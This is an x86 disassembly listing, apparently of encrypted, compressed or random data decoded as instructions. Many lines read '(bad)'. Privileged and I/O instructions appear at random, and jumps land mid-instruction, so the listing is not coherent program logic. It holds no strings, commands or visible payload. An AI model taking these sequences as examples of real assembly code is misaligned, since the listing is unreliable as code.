  4200f0:	fild   QWORD PTR [eax+0x1e9a1c76]
  4200f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4200f7:	inc    edx
  4200f8:	neg    ch
  4200fa:	mov    esi,0xcdea6b56
  4200ff:	jp     0x42016d
  420101:	addr16 lahf 
  420103:	in     eax,0x6c
  420105:	rcr    BYTE PTR [eax],1
  420107:	inc    edx
  420108:	dec    edx
  420109:	(bad)  
  42010a:	inc    esi
  42010b:	lea    esp,[ebx+0x7a4da696]
  420111:	test   ah,0x84
  420114:	cmp    BYTE PTR [esi+esi*8-0x62],0x98
  420119:	loope  0x420196
  42011b:	sub    DWORD PTR [edx+0x4af0fe2],edi
  420121:	aaa    
  420122:	mov    ?,WORD PTR [edi+0x57]
  420125:	cmp    BYTE PTR [ebp+0x46740673],ah
  42012b:	cld    
  42012c:	clc    
  42012d:	int    0xba
  42012f:	push   ebx
  420130:	iret   
  420131:	xor    DWORD PTR [ebx],ebp
  420133:	jecxz  0x4200c8
	...
  420195:	add    BYTE PTR [ebx-0x31],dh
  420198:	fwait
  420199:	cmp    DWORD PTR [edi+0x5dcff37d],edi
  42019f:	xchg   ebp,eax
  4201a0:	xchg   ebx,eax
  4201a1:	dec    edi
  4201a2:	mov    al,ds:0x7b6a9410
  4201a7:	push   esp
  4201a8:	add    DWORD PTR [eax],eax
  4201aa:	pop    es
  4201ab:	add    DWORD PTR [eax],eax
  4201ad:	add    ah,dh
  4201af:	jle    0x420136
  4201b1:	jae    0x420185
  4201b3:	xor    al,0x46
  4201b5:	dec    eax
  4201b6:	cld    
  4201b7:	inc    ecx
  4201b8:	pop    ss
  4201b9:	cs leave 
  4201bb:	sub    eax,DWORD PTR [ecx*2+0x27718e9d]
  4201c2:	pop    esi
  4201c3:	push   ebx
  4201c4:	cmp    al,0xb6
  4201c6:	lds    ecx,FWORD PTR [edx+edi*4]
  4201c9:	inc    DWORD PTR [edi-0x4c]
  4201cc:	mov    edi,0x35ed159d
  4201d1:	aas    
  4201d2:	add    BYTE PTR ds:0x9ed65401,0xaf
  4201d9:	inc    edi
  4201da:	sahf   
  4201db:	shl    BYTE PTR [eax+0x37],cl
  4201de:	and    DWORD PTR [eax+0x1db80951],esp
  4201e4:	fcomi  st,st(4)
  4201e6:	sahf   
  4201e7:	jo     0x42018e
  4201e9:	sbb    al,0xba
  4201eb:	fwait
  4201ec:	and    eax,DWORD PTR [ecx]
  4201ee:	dec    ebx
  4201ef:	loope  0x420213
  4201f1:	fisttp QWORD PTR [edx-0x397e13f7]
  4201f7:	xchg   edi,eax
  4201f8:	cmp    edx,ebp
  4201fa:	mov    dh,0xe3
  4201fc:	sub    BYTE PTR [ecx-0x78c5bd6c],0x95
  420203:	sub    DWORD PTR [eax+0x62],0xb1bfd57a
  42020a:	pop    edx
  42020b:	jmp    0x8c9d:0xe7e1921c
  420212:	and    ecx,ecx
  420214:	adc    cl,BYTE PTR [edx-0x7873931c]
  42021a:	push   edx
  42021b:	pop    ecx
  42021c:	les    ebx,FWORD PTR [ebx+0x69]
  42021f:	lods   eax,DWORD PTR ds:[esi]
  420220:	push   ecx
  420221:	loopne 0x420243
  420223:	mov    ch,0x11
  420225:	xor    al,dh
  420227:	xlat   BYTE PTR ds:[ebx]
  420228:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420229:	sbb    eax,0x1f57d60b
  42022e:	push   esp
  42022f:	mov    cl,0xf8
  420231:	addr16 xor esi,esi
  420234:	repnz push 0x55
  420237:	int3   
  420238:	in     eax,dx
  420239:	push   ds
  42023a:	mov    es,ecx
  42023c:	in     eax,0xa3
  42023e:	inc    ecx
  42023f:	dec    ecx
  420240:	push   esp
  420241:	add    BYTE PTR [ebx+eiz*1],0xec
  420245:	xor    al,BYTE PTR [esi]
  420247:	fadd   DWORD PTR [ecx-0x3e6f70d6]
  42024d:	(bad)  
  42024e:	(bad)  
  42024f:	arpl   WORD PTR [esi-0x60ca0f02],bp
  420255:	inc    eax
  420256:	push   0x6e
  420258:	retf   0xaf22
  42025b:	jecxz  0x420223
  42025d:	mov    BYTE PTR [ecx-0x14],ch
  420260:	into   
  420261:	cld    
  420262:	dec    edi
  420263:	xchg   esi,eax
  420264:	shr    BYTE PTR [esi+0x503caca0],cl
  42026a:	mov    al,ds:0xcb5d69bb
  42026f:	or     eax,0xb6f848ef
  420274:	mov    al,0x4c
  420276:	pop    esp
  420277:	lods   eax,DWORD PTR ds:[esi]
  420278:	inc    ebp
  420279:	push   eax
  42027a:	shl    BYTE PTR [ebp+0x36b35aab],1
  420280:	and    edx,DWORD PTR [ebx+0x4be234d]
  420286:	push   0xffffffbf
  420288:	(bad)  
  42028a:	inc    ecx
  42028b:	push   0x881e4802
  420290:	add    edx,DWORD PTR [ebx+esi*1+0x29]
  420294:	push   ecx
  420295:	std    
  420296:	fdiv   st(6),st
  420298:	adc    eax,0x5669d5f1
  42029d:	inc    edi
  42029e:	jb     0x4202d9
  4202a0:	(bad)  
  4202a1:	and    edi,DWORD PTR [ebp+0x622b3002]
  4202a7:	mov    WORD PTR [esi+0x68],fs
  4202aa:	mov    cl,dh
  4202ac:	pop    esp
  4202ad:	adc    ebx,DWORD PTR [esi]
  4202af:	add    bl,0x50
  4202b2:	adc    DWORD PTR [ecx-0x66],edi
	...
  420315:	add    BYTE PTR [ecx+0x6],al
  420318:	clc    
  420319:	mov    esi,0xff47feff
  42031e:	mov    cl,0x27
  420320:	pop    ebx
  420321:	fucomip st,st(0)
  420323:	daa    
  420324:	cmp    ebx,DWORD PTR [ebp-0x7e]
  420327:	push   ebp
  420328:	add    DWORD PTR [eax],eax
  42032a:	pop    es
  42032b:	add    DWORD PTR [eax],eax
  42032d:	add    BYTE PTR [esi-0x4c4bf1ff],bl
  420333:	mov    ds:0x6984a20f,al
  420338:	into   
  420339:	out    dx,eax
  42033a:	mov    WORD PTR [edi-0x1c],es
  42033d:	sub    al,0x1
  42033f:	pop    eax
  420340:	sbb    ecx,DWORD PTR ds:[ebp-0x44526ddd]
  420347:	fcomp  DWORD PTR [ebx+0x7021b689]
  42034d:	outs   dx,BYTE PTR ds:[esi]
  42034e:	cld    
  42034f:	jg     0x420325
  420351:	xor    DWORD PTR [ecx+0x57c8bc97],0x8cf4dd05
  42035b:	mov    cl,dh
  42035d:	das    
  42035e:	pop    esp
  42035f:	jp     0x42031f
  420361:	add    BYTE PTR [ecx-0x5d],0xc9
  420365:	popf   
  420366:	aaa    
  420367:	add    dl,ah
  420369:	mov    dh,0x4
  42036b:	(bad)  
  42036c:	or     eax,0x6a50e83
  420371:	sbb    ebx,DWORD PTR [edx+0x34]
  420374:	pop    es
  420375:	sub    al,0xd9
  420377:	ins    BYTE PTR es:[edi],dx
  420378:	mov    ds:0xd6c4f7ec,al
  42037d:	fwait
  42037e:	or     eax,0x2d1dad8e
  420383:	add    al,0x33
  420385:	test   eax,0x97ab16bf
  42038a:	push   0x6b92ba32
  42038f:	fnstenv cs:[eax+ebp*1+0x2a]
  420394:	int    0x47
  420396:	jg     0x42039e
  420398:	or     BYTE PTR [edx+0x1f],ch
  42039b:	jne    0x42035e
  42039d:	ins    DWORD PTR es:[edi],dx
  42039e:	fmul   DWORD PTR [edx-0x41]
  4203a1:	mov    ds:0x5222ca58,al
  4203a6:	pop    esi
  4203a7:	mov    al,ds:0xaa86b1d1
  4203ac:	and    DWORD PTR [edi-0x2795a288],edi
  4203b2:	mov    ebp,0xc4a2d8ae
  4203b7:	add    eax,0xd6896bfe
  4203bc:	jne    0x4203c9
  4203be:	out    0x81,eax
  4203c0:	adc    DWORD PTR [ebx],esp
  4203c2:	cmp    ah,al
  4203c4:	xlat   BYTE PTR ds:[ebx]
  4203c5:	call   0x9916af2e
  4203ca:	neg    al
  4203cc:	gs je  0x420437
  4203cf:	mov    dl,0x13
  4203d1:	fild   QWORD PTR [edx-0x4e11a01]
  4203d7:	hlt    
  4203d8:	mov    al,ds:0x7f5ab475
  4203dd:	jo     0x42041d
  4203df:	sahf   
  4203e0:	sbb    eax,DWORD PTR [esi+edi*8]
  4203e3:	mov    edi,0xc4bc110e
  4203e8:	jmp    0x4f63:0x158769bc
  4203ef:	cmp    DWORD PTR [esi],esi
  4203f1:	jae    0x420445
  4203f3:	jb     0x420398
  4203f5:	sbb    DWORD PTR [ebp-0x4db838b1],0xffffffa7
  4203fc:	xchg   esi,eax
  4203fd:	es xchg ebp,eax
  4203ff:	stos   DWORD PTR es:[edi],eax
  420400:	lds    ebp,FWORD PTR [edi]
  420402:	fmul   st,st(7)
  420404:	aam    0x87
  420406:	pop    edi
  420407:	push   0x104679ee
  42040c:	imul   edi,DWORD PTR [eax],0xffffffd9
  42040f:	sbb    al,0x8f
  420411:	push   eax
  420412:	push   ds
  420413:	xor    DWORD PTR [eax+ebp*2-0x23366895],0x39114c8a
  42041e:	mov    edi,0xb30d1b33
  420423:	scas   al,BYTE PTR es:[edi]
  420424:	mov    ch,0x33
  420426:	mov    eax,0x7289a39c
  42042b:	xor    eax,DWORD PTR [ebp+0x29f2e64d]
  420431:	or     dl,bl
  420433:	mov    edi,0x61
	...
  420494:	add    BYTE PTR [eax],al
  420496:	scas   al,BYTE PTR es:[edi]
  420497:	xchg   esp,eax
  420498:	push   edi
  420499:	adc    bh,BYTE PTR [edi-0x2d]
  42049c:	out    dx,eax
  42049d:	mov    esp,0xb41496f0
  4204a2:	dec    esi
  4204a3:	imul   esp,DWORD PTR [edi+eiz*8+0x15689],0x107
  4204ae:	or     al,0x86
  4204b0:	dec    ecx
  4204b1:	sbb    al,0x7
  4204b3:	or     ch,BYTE PTR [eax+0x7b27587d]
  4204b9:	mov    dl,0xa1
  4204bb:	mov    edx,0x33a1d7e7
  4204c0:	cmp    al,0xd9
  4204c2:	adc    ah,BYTE PTR [edi-0x42d8cfcc]
  4204c8:	xchg   edx,eax
  4204c9:	je     0x42044d
  4204cb:	in     al,0xeb
  4204cd:	xchg   ah,bl
  4204cf:	dec    ebp
  4204d0:	ds imul edx,edx,0xffffffae
  4204d4:	and    edx,esi
  4204d6:	mov    WORD PTR [esi-0x255e46c6],es
  4204dc:	mov    esp,0xe5843da4
  4204e1:	imul   ebx,DWORD PTR [edi-0x56b26ed5],0xffffffd9
  4204e8:	push   eax
  4204e9:	sbb    cl,dh
  4204eb:	xor    BYTE PTR [ebx+ebp*8-0x17baee28],cl
  4204f2:	jp     0x42049e
  4204f4:	pushf  
  4204f5:	mov    esi,0x2ef00efd
  4204fa:	sbb    eax,0x5545323d
  4204ff:	dec    edx
  420500:	dec    eax
  420501:	adc    al,0xca
  420503:	dec    esi
  420504:	xor    eax,0x45788e96
  420509:	aad    0x6e
  42050b:	dec    ecx
  42050c:	lds    ebp,FWORD PTR [edi]
  42050e:	mov    ebx,0xaec6d9f4
  420513:	inc    ebp
  420514:	push   ds
  420515:	(bad)  
  420516:	adc    eax,0xd687bc50
  42051b:	add    eax,0xc47e30e5
  420520:	ret    
  420521:	xor    BYTE PTR [ecx+ecx*2],ch
  420524:	add    eax,0x143e233c
  420529:	sbb    BYTE PTR [ecx+0x5],dl
  42052c:	adc    al,0xac
  42052e:	push   ds
  42052f:	mov    esp,DWORD PTR [ebp+0x6c]
  420532:	jne    0x4204fc
  420534:	dec    esp
  420535:	push   edx
  420536:	xchg   DWORD PTR [edi],ebx
  420538:	jnp    0x42054f
  42053a:	sbb    ebp,DWORD PTR ds:0xda1ff88
  420540:	sbb    BYTE PTR [ebp+ebp*2+0x4a7184d8],0xc7
  420548:	fcmovnu st,st(6)
  42054a:	bound  esp,QWORD PTR [ebx-0x7f]
  42054d:	xchg   edi,eax
  42054e:	push   eax
  42054f:	dec    eax
  420550:	ror    bh,cl
  420552:	mov    WORD PTR [edi+ecx*8],ds
  420555:	sub    ch,BYTE PTR [edi+0x6b]
  420558:	jmp    0x42056e
  42055a:	mov    al,ds:0x829908a7
  42055f:	and    al,0x2
  420561:	push   cs
  420562:	fdiv   DWORD PTR [edx-0x47]
  420565:	mov    eax,ds:0x5d3e4a8c
  42056a:	repz sbb eax,0xe1e391ba
  420570:	mov    cl,0x9a
  420572:	sbb    bh,bh
  420574:	dec    edx
  420575:	jecxz  0x4205d4
  420577:	fsub   st,st(3)
  420579:	test   eax,0x8abb5bbc
  42057e:	pushf  
  42057f:	adc    cl,BYTE PTR [ecx]
  420581:	pop    ds
  420582:	popa   
  420583:	rcr    DWORD PTR [edi-0x33],1
  420586:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420587:	clc    
  420588:	(bad)  
  420589:	lahf   
  42058a:	std    
  42058b:	int    0xe7
  42058d:	mov    eax,0xbbdd9402
  420592:	push   sp
  420594:	mov    bh,0x10
  420596:	cwde   
  420597:	in     al,dx
  420598:	dec    edx
  420599:	mov    ch,al
  42059b:	repnz aaa 
  42059d:	lods   al,BYTE PTR ds:[esi]
  42059e:	adc    ebx,ecx
  4205a0:	cdq    
  4205a1:	in     eax,0x67
  4205a3:	(bad)  
  4205a4:	test   DWORD PTR [edi-0x23],esi
  4205a7:	or     DWORD PTR [edi-0x1238524a],ebp
  4205ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4205ae:	mov    eax,ds:0x25c74b11
  4205b3:	xchg   edi,eax
  4205b4:	inc    edx
	...
  420615:	add    BYTE PTR [eax+ebp*2-0x2703f748],al
  42061c:	mov    ah,0xec
  42061e:	btc    DWORD PTR [edx],edx
  420621:	mov    ebx,0xe6f22f34
  420626:	nop
  420627:	push   edi
  420628:	add    DWORD PTR [eax],eax
  42062a:	pop    es
  42062b:	add    DWORD PTR [eax],eax
  42062d:	add    BYTE PTR [ebp-0x16ef72e7],ch
  420633:	mov    ah,0x89
  420635:	mov    ebx,0x46d95338
  42063a:	or     ah,BYTE PTR [esi+0x1b]
  42063d:	jo     0x42063f
  42063f:	fist   DWORD PTR [ebx]
  420641:	mov    ds:0xa5282267,eax
  420646:	and    ecx,edi
  420648:	mov    eax,ds:0xcbae326
  42064d:	rcr    DWORD PTR [ebx+0x6f599de5],cl
  420653:	push   ecx
  420654:	add    DWORD PTR [edx],ebp
  420656:	test   al,0xc3
  420658:	call   0x143c0135
  42065d:	xsaveopt [ebx+esi*2]
  420661:	jbe    0x4206b3
  420663:	xor    bh,ch
  420665:	pop    esi
  420666:	sbb    al,0xeb
  420668:	cwde   
  420669:	jnp    0x4206dd
  42066b:	jo     0x4206c7
  42066d:	cs push esi
  42066f:	mov    DWORD PTR [ebx],eax
  420671:	popa   
  420672:	retf   
  420673:	iret   
  420674:	jno    0x4206f2
  420676:	jge    0x4206b2
  420678:	dec    edx
  42067a:	push   0xffffff97
  42067c:	fs jle 0x4206d0
  42067f:	add    BYTE PTR [ebp-0x4a1ea2ae],al
  420685:	mov    al,0x49
  420687:	jmpw   0x542
  42068b:	fidivr DWORD PTR fs:[eax+0x32]
  42068f:	dec    edx
  420690:	jns    0x4206ba
  420692:	idiv   DWORD PTR [ecx]
  420694:	fsub   DWORD PTR [eax-0x5adbbc96]
  42069a:	mov    ecx,0x8a6271c2
  42069f:	adc    edi,edi
  4206a1:	enter  0xb75,0x9b
  4206a5:	icebp  
  4206a6:	(bad)  
  4206a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206a8:	sbb    esp,DWORD PTR es:[eax+0x246ef23d]
  4206af:	adc    ecx,esi
  4206b1:	adc    BYTE PTR [eax+0x24],dh
  4206b4:	cli    
  4206b5:	stc    
  4206b6:	sub    bh,BYTE PTR [edx+ecx*4-0xf08000b]
  4206bd:	fcmove st,st(7)
  4206bf:	cdq    
  4206c0:	out    0xfc,eax
  4206c2:	or     BYTE PTR [edx+edx*4+0x7fd1a66a],bl
  4206c9:	js     0x420723
  4206cb:	sbb    eax,0xf24f6da7
  4206d0:	cmp    eax,0xdd7e600d
  4206d5:	(bad)  
  4206d6:	ret    0x47bd
  4206d9:	cmp    BYTE PTR [ebx+0x20677524],dh
  4206df:	ss or  eax,0xb86b5b7f
  4206e5:	inc    edx
  4206e6:	jecxz  0x42071a
  4206e8:	mov    bh,0xe7
  4206ea:	or     esi,ebx
  4206ec:	add    BYTE PTR [edi+0x1b],ah
  4206ef:	cmp    al,0x67
  4206f1:	adc    BYTE PTR [eax-0x2],bh
  4206f4:	clc    
  4206f5:	jmp    0xf694a6b8
  4206fa:	or     eax,0xcf316894
  4206ff:	xchg   cl,al
  420701:	jmp    0xdb1cf599
  420706:	test   eax,0x13e8bbc3
  42070b:	leave  
  42070c:	push   es
  42070d:	fild   QWORD PTR es:[ecx+0x32]
  420711:	sbb    DWORD PTR [ebp+0x21],ecx
  420714:	call   0x8e9e972e
  420719:	ins    BYTE PTR es:[edi],dx
  42071a:	shr    BYTE PTR [edx-0x6c],1
  42071d:	mov    WORD PTR [esi],ds
  42071f:	mov    DWORD PTR [eax+0x0],esp
  420722:	jne    0x42074d
  420724:	imul   DWORD PTR [ecx-0x3c]
  420727:	inc    ebp
  420728:	ja     0x42074c
  42072a:	dec    ebx
  42072b:	jmp    0x5657925f
  420730:	clc    
  420731:	inc    ebp
  420732:	in     eax,0xef
  420734:	mov    eax,DWORD PTR [eax]
	...
  420796:	mov    DWORD PTR [edi],ebp
  420798:	and    eax,0xad8aa780
  42079d:	das    
  42079e:	jmp    0x3a6da37a
  4207a3:	daa    
  4207a4:	rcl    BYTE PTR [ebp+0x15897],0x7
  4207ab:	add    DWORD PTR [eax],eax
  4207ad:	add    BYTE PTR [ebx-0x5116eb9f],al
  4207b3:	push   esi
  4207b4:	cwde   
  4207b5:	jo     0x4207da
  4207b7:	cli    
  4207b8:	xor    DWORD PTR [esi],edi
  4207ba:	in     al,0x6c
  4207bc:	jns    0x4207b9
  4207be:	sahf   
  4207bf:	pop    es
  4207c0:	adc    dh,BYTE PTR [ecx]
  4207c2:	dec    edx
  4207c3:	cs ins DWORD PTR es:[edi],dx
  4207c5:	int    0xdf
  4207c7:	mov    BYTE PTR [edx+0x487c929b],cl
  4207cd:	int3   
  4207ce:	mov    ch,0x49
  4207d0:	js     0x420775
  4207d2:	arpl   WORD PTR [edx],si
  4207d4:	fcomip st,st(6)
  4207d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4207d7:	pushf  
  4207d8:	into   
  4207d9:	aam    0xb0
  4207db:	mov    ah,0x58
  4207dd:	test   ah,al
  4207df:	push   edi
  4207e0:	add    al,0xe2
  4207e2:	aaa    
  4207e3:	add    edx,DWORD PTR [edx-0x4e7762fa]
  4207e9:	ins    DWORD PTR es:[edi],dx
  4207ea:	mov    ah,0x41
  4207ec:	add    BYTE PTR [esi-0x67],dh
  4207ef:	outs   dx,BYTE PTR ds:[esi]
  4207f0:	xchg   ebp,eax
  4207f1:	jnp    0x42082c
  4207f3:	cmp    DWORD PTR [edx+0x7b],eax
  4207f6:	dec    edx
  4207f7:	xor    ah,BYTE PTR [esp+eax*4]
  4207fa:	jno    0x42079c
  4207fc:	mov    ch,0x96
  4207fe:	push   ds
  4207ff:	xchg   ecx,eax
  420800:	cs inc eax
  420802:	mov    al,ds:0x2fdc6244
  420807:	clc    
  420808:	inc    edi
  420809:	out    0x44,eax
  42080b:	or     bl,BYTE PTR [edi-0x70914a17]
  420811:	push   ebx
  420812:	mov    ch,0x41
  420814:	xchg   ebx,eax
  420815:	rcl    BYTE PTR [ecx+0x2be03b6],1
  42081b:	inc    ecx
  42081c:	mov    ds:0x6585675a,eax
  420821:	xchg   BYTE PTR [ecx+0x54],dl
  420824:	cmp    al,0xb1
  420826:	cmp    BYTE PTR [eax+0x9],ah
  420829:	hlt    
  42082a:	cmp    DWORD PTR [esi-0x69],ebp
  42082d:	in     eax,0x9a
  42082f:	rcr    ah,1
  420831:	mov    al,ds:0x754feed2
  420836:	dec    ebp
  420837:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420838:	pop    esp
  420839:	adc    eax,0xf5ec3fd0
  42083e:	les    ecx,FWORD PTR [esi+edx*1-0x57]
  420842:	aas    
  420843:	mov    al,0x7e
  420845:	sbb    eax,0x11ada5bb
  42084a:	mov    esp,0xd8ec9b8d
  42084f:	fsub   st,st(0)
  420851:	sub    ebp,edi
  420853:	js     0x42082c
  420855:	mov    ecx,0x8422410b
  42085a:	int    0xfe
  42085c:	or     al,0x1e
  42085e:	pop    es
  42085f:	ss dec esi
  420861:	repz sub eax,0x460c906
  420867:	adc    al,0x2a
  420869:	popf   
  42086a:	xlat   BYTE PTR ds:[ebx]
  42086b:	jge    0x42081f
  42086d:	ror    DWORD PTR [ecx],1
  42086f:	rcr    bl,cl
  420871:	jns    0x42080e
  420873:	pop    esi
  420874:	and    al,0x61
  420876:	push   ebp
  420877:	xchg   edx,eax
  420878:	mov    bl,0xc3
  42087a:	xchg   BYTE PTR [ebp-0x13277003],ch
  420880:	mov    ecx,0x52b20952
  420885:	mov    bl,0x48
  420887:	add    BYTE PTR [ecx+0x5105a476],al
  42088d:	mov    bh,0x11
  42088f:	test   BYTE PTR [edi-0x43],0xbf
  420893:	add    ecx,DWORD PTR [edi]
  420895:	fs mov esp,0x923b6792
  42089b:	lahf   
  42089c:	mov    eax,0x63638585
  4208a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4208a2:	test   eax,0x17cb5978
  4208a7:	mov    ebp,DWORD PTR [edx]
  4208a9:	shl    DWORD PTR ds:0x52540e82,0x9d
  4208b0:	fcmovbe st,st(1)
  4208b2:	not    DWORD PTR [edx]
  4208b4:	nop
	...
  420915:	add    ah,bl
  420917:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420918:	jae    0x420967
  42091a:	jnp    0x4208fb
  42091c:	(bad)  
  42091d:	mov    ch,0x79
  42091f:	jne    0x42092f
  420921:	ret    0x4cae
  420924:	xchg   ebp,eax
  420925:	hlt    
  420926:	sahf   
  420927:	pop    ecx
  420928:	add    DWORD PTR [eax],eax
  42092a:	pop    es
  42092b:	add    DWORD PTR [eax],eax
  42092d:	add    BYTE PTR [edi],bl
  42092f:	mov    al,ds:0xfc214b22
  420934:	sahf   
  420935:	xor    DWORD PTR [eax+0x3c],esp
  420938:	cmp    ecx,DWORD PTR [esi]
  42093a:	out    dx,eax
  42093b:	jecxz  0x42098d
  42093d:	push   ecx
  42093e:	sub    ebp,DWORD PTR [ecx-0x49]
  420941:	cli    
  420942:	(bad)  
  420943:	je     0x420909
  420945:	jne    0x420960
  420947:	push   edi
  420948:	pop    ebx
  420949:	test   al,0xc0
  42094b:	outs   dx,DWORD PTR ds:[esi]
  42094c:	sbb    bh,bh
  42094e:	push   edx
  42094f:	jne    0x42091b
  420951:	dec    ebx
  420952:	push   ss
  420953:	in     eax,0x5a
  420955:	xchg   BYTE PTR es:[eax+0x4b],bl
  420959:	xchg   edx,eax
  42095a:	mov    esp,ebp
  42095c:	daa    
  42095d:	out    0xd5,al
  42095f:	inc    esp
  420960:	stos   DWORD PTR es:[edi],eax
  420961:	int3   
  420962:	xor    cl,BYTE PTR [edi-0x2d180e5b]
  420968:	sbb    eax,0x1825482d
  42096d:	cs dec ecx
  42096f:	jmp    0x35d:0x409428cb
  420976:	pop    ecx
  420977:	sub    al,0xfb
  420979:	mov    ch,0x8b
  42097b:	(bad)  
  42097c:	std    
  42097d:	sub    al,0x48
  42097f:	mov    edi,0x52a86fe0
  420984:	es shr esi,cl
  420987:	mov    al,ds:0x29868360
  42098c:	and    eax,DWORD PTR ds:0xd939c63e
  420992:	inc    edx
  420993:	mov    ebx,0xa71d4f42
  420998:	call   0x7e461ee9
  42099d:	push   es
  42099e:	mov    bh,0x7b
  4209a0:	sahf   
  4209a1:	push   edi
  4209a2:	pop    edi
  4209a3:	(bad)  
  4209a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4209a5:	push   esp
  4209a6:	adc    edi,edi
  4209a8:	mov    al,BYTE PTR [ebp-0x205e4e5]
  4209ae:	pop    eax
  4209af:	syscall 
  4209b1:	out    0x1e,al
  4209b3:	or     bh,bh
  4209b5:	mov    al,ds:0xf6db7f8
  4209ba:	xlat   BYTE PTR ds:[ebx]
  4209bb:	int3   
  4209bc:	and    BYTE PTR [ebx+0x325049cc],0x95
  4209c3:	xor    al,0x1a
  4209c5:	mov    cl,0x12
  4209c7:	test   DWORD PTR [eax],esi
  4209c9:	nop
  4209ca:	outs   dx,DWORD PTR ds:[esi]
  4209cb:	add    BYTE PTR [eax],0x4c
  4209ce:	popw   ss
  4209d0:	and    cl,ch
  4209d2:	pop    eax
  4209d3:	out    dx,al
  4209d4:	pop    esi
  4209d5:	arpl   si,si
  4209d7:	mov    bh,BYTE PTR [ecx-0x57]
  4209da:	fistp  DWORD PTR [ebp+0x4c]
  4209dd:	push   es
  4209de:	out    0x41,eax
  4209e0:	add    al,0xf5
  4209e2:	and    DWORD PTR [ebp+0x45],0x2784b7d8
  4209e9:	mov    al,0x25
  4209eb:	out    0x9c,al
  4209ed:	out    dx,eax
  4209ee:	test   BYTE PTR [edi+0x2de36f87],bh
  4209f4:	xor    ah,ch
  4209f6:	mov    cl,0x2
  4209f8:	xor    esp,DWORD PTR ds:0x16d3d73b
  4209fe:	das    
  4209ff:	mov    edi,0x92707134
  420a04:	lods   al,BYTE PTR ds:[esi]
  420a05:	or     bh,BYTE PTR [ebp+0x1e]
  420a08:	lods   al,BYTE PTR ds:[esi]
  420a09:	es pop esp
  420a0b:	test   al,0x56
  420a0d:	cmp    BYTE PTR [ecx+0x5d853f31],cl
  420a13:	cmp    ebp,DWORD PTR [ebx+eiz*8]
  420a16:	fstp   TBYTE PTR [esi-0x28475a9b]
  420a1c:	aaa    
  420a1d:	in     eax,0x95
  420a1f:	out    0x79,al
  420a21:	ficom  WORD PTR [ecx-0x3957df7f]
  420a27:	data16 aaa 
  420a29:	xor    eax,0x8b58d50d
  420a2e:	add    DWORD PTR [ebx-0x39],eax
  420a31:	mov    DWORD PTR [esi-0x69],0x82
	...
  420a94:	add    BYTE PTR [eax],al
  420a96:	fbstp  TBYTE PTR [edx]
  420a98:	scas   eax,DWORD PTR es:[edi]
  420a99:	adc    ebp,edi
  420a9b:	lahf   
  420a9c:	(bad)  
  420a9d:	(bad)  
  420a9e:	(bad)  
  420aa0:	std    
  420aa1:	test   cl,bl
  420aa3:	cmovnp ebx,DWORD PTR [ecx]
  420aa6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420aa7:	pop    edx
  420aa8:	add    DWORD PTR [eax],eax
  420aaa:	pop    es
  420aab:	add    DWORD PTR [eax],eax
  420aad:	add    bh,cl
  420aaf:	aam    0x55
  420ab1:	sbb    ebx,eax
  420ab3:	pop    es
  420ab4:	in     al,0x37
  420ab6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ab7:	outs   dx,DWORD PTR ds:[esi]
  420ab8:	inc    edi
  420ab9:	xchg   edx,eax
  420aba:	or     BYTE PTR [edx],dh
  420abc:	xchg   edi,eax
  420abd:	jnp    0x420b0b
  420abf:	pop    ebp
  420ac0:	out    0x77,al
  420ac2:	pop    ds
  420ac3:	add    al,0x77
  420ac5:	sub    eax,edx
  420ac7:	(bad)  
  420ac8:	mov    ch,0x85
  420aca:	or     DWORD PTR [edx],0x2a
  420acd:	sub    eax,0xabc8889c
  420ad2:	es dec ecx
  420ad4:	test   DWORD PTR [ecx+0x56b8bb13],edx
  420ada:	shr    DWORD PTR [edx-0xf],cl
  420add:	in     al,0x93
  420adf:	loope  0x420a85
  420ae1:	js     0x420ad4
  420ae3:	sar    DWORD PTR ds:[eax-0x38b05a2a],cl
  420aea:	mov    cl,0x51
  420aec:	adc    al,0xdb
  420aee:	add    ebx,DWORD PTR [esi+0x14]
  420af1:	add    al,0xdc
  420af3:	inc    edx
  420af4:	ret    
  420af5:	xor    cl,BYTE PTR [eax]
  420af7:	(bad)  
  420af8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420af9:	fidiv  WORD PTR [edx-0x581f6085]
  420aff:	pop    ebp
  420b00:	and    eax,0x33
  420b03:	mov    BYTE PTR [eax],cl
  420b05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b06:	test   al,0x2b
  420b08:	inc    ebx
  420b09:	ja     0x420ac4
  420b0b:	std    
  420b0c:	xor    esp,0x3b
  420b0f:	test   DWORD PTR [ebx-0x44],edi
  420b12:	ret    
  420b13:	rol    BYTE PTR [edi-0x48],0x2a
  420b17:	xor    bh,BYTE PTR [edx-0x4a228183]
  420b1d:	cwde   
  420b1e:	and    al,0x60
  420b20:	xchg   DWORD PTR [edi+0x21],ecx
  420b23:	outs   dx,BYTE PTR ds:[esi]
  420b24:	mov    DWORD PTR [ecx-0x134254d9],edx
  420b2a:	xchg   edi,eax
  420b2b:	xor    eax,0x98ccbdea
  420b30:	scas   eax,DWORD PTR es:[edi]
  420b31:	push   esi
  420b32:	dec    ebx
  420b33:	lds    eax,FWORD PTR [ebx-0x4cec7829]
  420b39:	push   esi
  420b3a:	fwait
  420b3b:	mov    dh,0x29
  420b3d:	popa   
  420b3e:	lds    ebx,FWORD PTR [esi]
  420b40:	std    
  420b41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b42:	gs clc 
  420b44:	and    eax,0x60b6fcbe
  420b49:	add    al,BYTE PTR [edx+0x47]
  420b4c:	ss jbe 0x420ad4
  420b4f:	sbb    eax,ebp
  420b51:	mov    ah,0xd3
  420b53:	fcom   DWORD PTR [ecx+0x13]
  420b56:	mov    eax,0x80bd5b7d
  420b5b:	inc    esi
  420b5c:	lea    ebx,[eax]
  420b5e:	mov    ah,0x70
  420b60:	mov    ebp,0x1b36c364
  420b65:	ds xor al,0x91
  420b68:	gs sbb ecx,esi
